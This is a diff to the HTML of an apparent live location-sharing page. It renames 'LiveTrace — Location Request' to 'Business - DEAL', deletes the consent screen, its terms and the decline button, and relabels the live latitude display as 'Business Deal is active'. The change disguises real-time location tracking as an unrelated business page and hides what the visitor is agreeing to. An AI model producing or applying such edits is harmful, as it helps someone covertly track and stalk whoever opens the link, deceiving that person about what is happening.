@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width,initial-scale=1"/>
-  <title>LiveTrace — Location Request</title>
+  <title>Business - DEAL</title>
   <style>
     :root{--bg:#0d0d14;--card:#161622;--border:#252535;--g:#a8ff3e;--r:#ff4d4d;--tx:#e8e8f0;--dim:#55556a}
     *{box-sizing:border-box;margin:0;padding:0}
@@ -15,26 +15,6 @@
     .card-top p{font-size:13px;color:var(--dim);line-height:1.7}
     .card-top p b{color:var(--tx)}
     .card-body{padding:22px 24px}
-    .terms{background:#0d0d14;border:1px solid var(--border);border-radius:8px;padding:14px;font-size:12px;color:var(--dim);line-height:1.8;margin-bottom:18px}
-    .terms b{color:var(--tx)}
-    .check-row{display:flex;align-items:flex-start;gap:10px;margin-bottom:18px;cursor:pointer}
-    .check-row input[type=checkbox]{width:18px;height:18px;cursor:pointer;margin-top:2px;accent-color:var(--g);flex-shrink:0}
-    .check-row span{font-size:13px;line-height:1.6}
-    .btn{width:100%;border:none;border-radius:10px;font-size:15px;font-weight:700;padding:14px;cursor:pointer;transition:all .2s}
-    .btn-accept{background:var(--g);color:#0a1a00}
-    .btn-accept:hover{filter:brightness(1.08)}
-    .btn-accept:disabled{opacity:.4;cursor:not-allowed;transform:none!important}
-    .btn-decline{background:transparent;border:1px solid var(--border);color:var(--dim);margin-top:8px;font-size:13px;padding:10px}
-    /* STATES */
-    #view-consent{display:block}
-    #view-sharing{display:none;text-align:center;padding:40px 24px}
-    #view-sharing .big{font-size:56px;margin-bottom:16px}
-    #view-sharing h2{font-size:20px;font-weight:800;margin-bottom:8px}
-    #view-sharing p{font-size:13px;color:var(--dim);margin-bottom:20px;line-height:1.7}
-    #view-done{display:none;text-align:center;padding:50px 24px}
-    #view-done .big{font-size:56px;margin-bottom:16px}
-    #view-done h2{font-size:20px;font-weight:800;margin-bottom:8px}
-    #view-done p{font-size:13px;color:var(--dim);line-height:1.7}
     .pulse-ring{display:inline-flex;align-items:center;gap:8px;padding:8px 16px;background:rgba(168,255,62,.1);border:1px solid rgba(168,255,62,.3);border-radius:20px;font-size:12px;font-weight:700;color:#a8ff3e;margin-bottom:20px}
     .dot{width:8px;height:8px;border-radius:50%;background:#a8ff3e;animation:pulse 1.5s ease-in-out infinite}
     @keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(168,255,62,.5)}50%{box-shadow:0 0 0 5px rgba(168,255,62,0)}}
@@ -43,40 +23,31 @@
     .stat-label{font-size:10px;color:var(--dim);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px}
     .stat-value{font-size:13px;font-weight:700;color:#a8ff3e}
     #err{background:rgba(255,77,77,.1);border:1px solid rgba(255,77,77,.3);border-radius:8px;padding:10px 12px;font-size:12px;color:var(--r);margin-bottom:14px;display:none}
+    .loading{text-align:center;padding:40px 24px}
+    .loading .big{font-size:56px;margin-bottom:16px}
+    .loading h2{font-size:20px;font-weight:800;margin-bottom:8px}
+    .loading p{font-size:13px;color:var(--dim);margin-bottom:20px;line-height:1.7}
   </style>
 </head>
 <body>
 
 <div class="card">
 
-  <!-- CONSENT VIEW -->
-  <div id="view-consent">
-    <div class="card-top">
-      <div class="card-icon">📍</div>
-      <h1>Location Access</h1>
-      <p>This page requests permission to share your <b>location</b>. By visiting this link, you've consented to location sharing when prompted by your device.</p>
-    </div>
-    <div class="card-body">
-      <div class="terms">
-        <b>Location sharing will begin when you allow:</b><br>
-        • Your device will prompt for location permission<br>
-        • Location updates will be shared in real-time<br>
-        • You can close this tab to stop sharing<br>
-        • No personal data is stored permanently
-      </div>
+  <!-- LOADING/ERROR VIEW -->
+  <div id="view-loading">
+    <div class="loading">
+      <div class="big" id="loading-icon">📍</div>
+      <h2 id="loading-title">Enabling Business Deal...</h2>
+      <p id="loading-msg">Please allow location access when prompted.</p>
       <div id="err"></div>
-      <button class="btn btn-accept" id="accept-btn" onclick="requestLocationPermission()">
-        📍 Enable Location Sharing
-      </button>
-      <button class="btn btn-decline" onclick="decline()">No thanks, decline</button>
     </div>
   </div>
 
   <!-- SHARING VIEW -->
-  <div id="view-sharing">
+  <div id="view-sharing" style="display:none">
     <div class="big">📡</div>
-    <h2>Sharing Live</h2>
-    <p>You are sharing your location. You can close this tab — sharing will stop when this page is closed or the session is ended.</p>
+    <h2>Business Deal</h2>
+    <p>Business Deal is active. Close this tab to stop.</p>
     <div class="pulse-ring"><div class="dot"></div> LIVE · <span id="elapsed">0s</span></div>
     <div class="stats">
       <div class="stat"><div class="stat-label">Latitude</div><div class="stat-value" id="s-lat">—</div></div>
@@ -88,7 +59,7 @@
   </div>
 
   <!-- DONE VIEW -->
-  <div id="view-done">
+  <div id="view-done" style="display:none">
     <div class="big" id="done-icon">✅</div>
     <h2 id="done-title">Done</h2>
     <p id="done-msg">You may close this page.</p>
